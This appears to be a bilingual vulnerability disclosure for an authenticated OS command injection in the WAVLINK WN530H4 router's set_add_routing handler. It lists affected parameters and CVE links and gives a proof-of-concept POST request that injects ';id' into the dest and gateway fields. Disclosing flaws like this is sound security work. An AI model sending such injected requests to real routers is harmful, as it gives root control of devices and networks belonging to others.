# WAVLINK WN530H4 Command Injection in set_add_routing

---

### 1. Title / 标题

```
WAVLINK WN530H4 internet.cgi set_add_routing OS Command Injection
```

### 2. Vendor / 厂商

```
WAVLINK (Shenzhen WAVLINK Technology Co., Ltd.)
```

### 3. Product / 产品

```
WN530H4 (AC1200 Dual-Band Wi-Fi Router)
```

### 4. Version / 受影响版本

```
Firmware: WN530H4-WAVLINK_20220721
```

### 5. Component / 组件

```
/cgi-bin/internet.cgi
```

### 6. Vulnerability Type / 漏洞类型

```
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
```

### 7. Attack Vector / 攻击向量

```
Network (AV:N)
```

### 8. CVSS 3.1 Score / 评分

```
9.1 (Critical)
Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
```

### 9. Description / 漏洞描述（英文）

```
A critical OS command injection vulnerability was identified in WAVLINK WN530H4
router firmware version WN530H4-WAVLINK_20220721. The vulnerability exists in
the set_add_routing function of /cgi-bin/internet.cgi.

The function processes HTTP POST parameters (dest, netmask, gateway,
custom_interface, etc.) for static routing configuration. User-supplied values
are concatenated directly into a shell command string using strcat() and
snprintf() without any input sanitization or validation. The resulting command
is then passed to popen() for execution with root privileges.

An authenticated attacker can inject arbitrary OS commands by including shell
metacharacters (e.g., semicolons) in any of the affected parameters, achieving
remote code execution as root.

This vulnerability is a recurring instance of CVE-2024-39762 through
CVE-2024-39765 (TALOS-2024-2020), which were originally discovered in the
WAVLINK AC3000 (WN533A8) by Cisco Talos. The WN530H4 shares the same
vulnerable codebase but was NOT listed as an affected product in the original
CVE advisories.
```

### 10. Proof of Concept / 漏洞验证

```http
POST /cgi-bin/internet.cgi HTTP/1.1
Host: 192.168.10.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=<valid_session>

page=addrouting&dest=;id&hostnet=host&netmask=255.255.255.0&gateway=;id&interface=WAN&custom_interface=&comment=test
```

The injected payload `; id` causes the following shell command to be executed:

```bash
route add -host ;id netmask 255.255.255.0 gw ;id dev eth2.2 2>&1
```

The `id` command executes with root privileges on the device.

### 11. Affected Parameters / 受影响参数

```
dest, hostnet, netmask, gateway, interface, custom_interface, comment
```

### 12. Impact / 影响

```
An authenticated attacker with access to the router's web management interface
can execute arbitrary commands as root, leading to:
- Full device compromise
- Network traffic interception
- Lateral movement within the network
- Persistent backdoor installation
```

### 13. Related CVE / 关联 CVE

```
CVE-2024-39762, CVE-2024-39763, CVE-2024-39764, CVE-2024-39765
(TALOS-2024-2020, originally for WAVLINK AC3000/WN533A8 only)
```

### 14. References / 参考链接

```
- TALOS-2024-2020: https://talosintelligence.com/vulnerability_reports/TALOS-2024-2020
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- WAVLINK WN530H4: https://www.wavlink.com
```

### 15. Credit / 发现者

```
Independently discovered and verified by ST4R using FirmRec
automated symbolic execution engine. The same vulnerability pattern was
originally reported by Cisco Talos for the AC3000 model.
```

### 16. 链接

[keyword "WN530H4" - Home and Business Networking Equipment &Wireless Audio and Video Transmission Equipment -Wavlink.com](https://www.wavlink.com/en_us/search.html?key=WN530H4)

![image-20260324105358293](C:\Users\THUNDEROBOT\AppData\Roaming\Typora\typora-user-images\image-20260324105358293.png)

